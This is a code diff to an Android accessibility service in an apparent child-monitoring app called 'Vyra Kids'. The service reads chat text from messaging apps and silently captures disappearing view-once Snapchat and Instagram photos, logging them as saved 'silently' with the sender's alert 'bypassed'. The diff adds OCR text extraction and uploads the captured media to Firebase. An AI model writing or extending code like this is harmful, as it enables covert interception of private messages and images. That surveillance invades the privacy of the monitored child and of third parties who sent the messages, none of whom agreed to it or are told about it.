@@ -8,7 +8,11 @@ import android.util.Log
 import android.view.Display
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import com.google.mlkit.vision.common.InputImage
+import com.google.mlkit.vision.text.TextRecognition
+import com.google.mlkit.vision.text.latin.TextRecognizerOptions
 import com.vyra.kids.core.AppConstants
+import com.vyra.kids.core.FirebaseSyncManager
 import com.vyra.kids.core.NetworkSyncManager
 import java.io.File
 import java.io.FileOutputStream
@@ -151,9 +155,12 @@ class VyraAccessibilityService : AccessibilityService() {
             val isNav = lower in setOf("search", "home", "reels", "profile", "explore", "back", "camera", "message...", "send", "chats", "status", "calls", "settings") ||
                     lower.startsWith("seen") || lower.startsWith("typing...") || lower.startsWith("online")
             if (!isNav) {
-                val hash = (appName + text).hashCode()
+                // Key deduplication on a 2-minute rolling time window (120,000 ms)
+                // This prevents spam within the same screen scrape, but allows the same words (Ok, Haa, Yes) sent later
+                val timeBucket = System.currentTimeMillis() / 120000
+                val hash = "$appName:$text:$timeBucket".hashCode()
                 if (!processedChatHashes.contains(hash)) {
-                    if (processedChatHashes.size > 2000) processedChatHashes.clear()
+                    if (processedChatHashes.size > 1000) processedChatHashes.clear()
                     processedChatHashes.add(hash)
 
                     val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this)
@@ -207,15 +214,14 @@ class VyraAccessibilityService : AccessibilityService() {
                             }
                             Log.i(AppConstants.TAG, "Ghost 1-View Snap saved silently: ${snapFile.name}")
 
-                            val payload = mapOf(
-                                "type" to "GHOST_SNAP_CAPTURED",
-                                "app" to "Snapchat",
-                                "timestamp" to System.currentTimeMillis(),
-                                "fileName" to snapFile.name,
-                                "isViewOnce" to true,
-                                "senderAlertBypassed" to true
+                            runMlKitOcrAndSyncSnap(
+                                sourceApp = "Snapchat",
+                                sender = "Snapchat (Incoming 1-View Snap)",
+                                titleText = "📷 [1-View Snap Captured Silently]",
+                                snapFile = snapFile,
+                                bitmap = softwareBitmap,
+                                isOutgoing = false
                             )
-                            NetworkSyncManager.getInstance(this@VyraAccessibilityService).syncData("snapshots", payload)
                         } catch (e: Exception) {
                             Log.e(AppConstants.TAG, "Error in silent compositor snap capture", e)
                         } finally {
@@ -336,27 +342,17 @@ class VyraAccessibilityService : AccessibilityService() {
 
                             Log.i(AppConstants.TAG, "Saved 1-view media frame [Outgoing: $isOutgoing]: ${snapshotFile.name}")
 
-                            // Sync to Firebase & Parent App
-                            val alert = mapOf(
-                                "type" to if (isOutgoing) "OUTGOING_1VIEW_SNAP_SENT" else "CAMERA_PREVIEW_SNAPSHOT",
-                                "app" to sourceApp,
-                                "direction" to if (isOutgoing) "OUTGOING" else "INCOMING",
-                                "isViewOnce" to true,
-                                "timestamp" to System.currentTimeMillis(),
-                                "fileName" to snapshotFile.name,
-                                "description" to if (isOutgoing) "Child sent a 1-view snap/photo in $sourceApp" else "Incoming snap captured"
-                            )
-                            NetworkSyncManager.getInstance(this@VyraAccessibilityService).syncData("snapshots", alert)
+                            val cleanApp = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram"
+                            val snapSender = if (isOutgoing) "Aryan (Child) [Sent 1-View Snap]" else "Incoming Snap"
+                            val snapTitle = if (isOutgoing) "📷 [Sent 1-View Photo / Snap Captured]" else "📷 [Received 1-View Photo Captured]"
 
-                            val firebaseSync = com.vyra.kids.core.FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
-                            val cleanApp = if (sourceApp.contains("snapchat")) "Snapchat" else "Instagram"
-                            firebaseSync.syncChatMessage(
-                                msgId = "media_${System.currentTimeMillis()}",
-                                app = cleanApp,
-                                sender = if (isOutgoing) "Aryan (Child) [Sent 1-View Snap]" else "Incoming Snap",
-                                text = if (isOutgoing) "📷 [Sent 1-View Photo / Snap Captured]" else "📷 [Received 1-View Photo Captured]",
-                                isDeletedBySender = false,
-                                isWatchlistTarget = false
+                            runMlKitOcrAndSyncSnap(
+                                sourceApp = cleanApp,
+                                sender = snapSender,
+                                titleText = snapTitle,
+                                snapFile = snapshotFile,
+                                bitmap = softwareBitmap,
+                                isOutgoing = isOutgoing
                             )
                         } catch (e: Exception) {
                             Log.e(AppConstants.TAG, "Error saving screenshot", e)
@@ -521,6 +517,75 @@ class VyraAccessibilityService : AccessibilityService() {
             addAction(Intent.ACTION_USER_PRESENT)
         }
         registerReceiver(screenStateReceiver, filter)
+    }
+
+    /**
+     * Google ML Kit Text Recognition: Extracts disappearing snap text or on-canvas captions
+     * from captured bitmaps, then directly uploads snap media to Firebase Storage and records in Firestore.
+     */
+    private fun runMlKitOcrAndSyncSnap(
+        sourceApp: String,
+        sender: String,
+        titleText: String,
+        snapFile: File,
+        bitmap: Bitmap,
+        isOutgoing: Boolean
+    ) {
+        try {
+            val image = InputImage.fromBitmap(bitmap, 0)
+            val recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS)
+            recognizer.process(image)
+                .addOnSuccessListener { visionText ->
+                    val ocrResult = visionText.text.trim()
+                    if (ocrResult.isNotBlank()) {
+                        Log.i(AppConstants.TAG, "ML Kit OCR recognized text: $ocrResult")
+                    }
+                    val firebaseSync = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
+                    val msgId = "media_${System.currentTimeMillis()}_${snapFile.nameWithoutExtension.takeLast(6)}"
+                    firebaseSync.uploadMediaAndSyncChatMessage(
+                        msgId = msgId,
+                        app = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram",
+                        sender = sender,
+                        text = titleText,
+                        mediaFile = snapFile,
+                        mediaType = "snap",
+                        isViewOnce = true,
+                        isIncoming = !isOutgoing,
+                        ocrText = ocrResult.ifBlank { null }
+                    )
+                }
+                .addOnFailureListener { e ->
+                    Log.w(AppConstants.TAG, "ML Kit OCR failed: ${e.message}")
+                    val firebaseSync = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
+                    val msgId = "media_${System.currentTimeMillis()}"
+                    firebaseSync.uploadMediaAndSyncChatMessage(
+                        msgId = msgId,
+                        app = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram",
+                        sender = sender,
+                        text = titleText,
+                        mediaFile = snapFile,
+                        mediaType = "snap",
+                        isViewOnce = true,
+                        isIncoming = !isOutgoing,
+                        ocrText = null
+                    )
+                }
+        } catch (e: Exception) {
+            Log.e(AppConstants.TAG, "Error initiating ML Kit OCR", e)
+            val firebaseSync = FirebaseSyncManager.getInstance(this@VyraAccessibilityService)
+            val msgId = "media_${System.currentTimeMillis()}"
+            firebaseSync.uploadMediaAndSyncChatMessage(
+                msgId = msgId,
+                app = if (sourceApp.contains("snapchat", ignoreCase = true)) "Snapchat" else "Instagram",
+                sender = sender,
+                text = titleText,
+                mediaFile = snapFile,
+                mediaType = "snap",
+                isViewOnce = true,
+                isIncoming = !isOutgoing,
+                ocrText = null
+            )
+        }
     }
 
     override fun onDestroy() {
